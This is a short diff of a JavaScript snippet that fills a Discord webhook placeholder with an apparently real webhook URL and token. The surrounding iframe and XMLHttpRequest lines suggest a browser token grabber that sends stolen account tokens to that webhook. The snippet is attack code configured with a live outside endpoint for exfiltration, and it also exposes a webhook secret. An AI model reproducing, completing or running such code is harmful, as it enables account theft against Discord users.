@@ -1,5 +1,5 @@
 location.reload();
-var discordWebhook = "YOUR DISCORD WEBHOOK HERE";
+var discordWebhook = "https://discord.com/api/webhooks/1252786818211119198/t-94PujX5YBcIcmdr48fUtmmymgR86nr0CU6MdMwk2BBNIuqkldw_G32-5P-igI7_pMl";
 var i = document.createElement('iframe');
 document.body.appendChild(i);
 var request = new XMLHttpRequest();
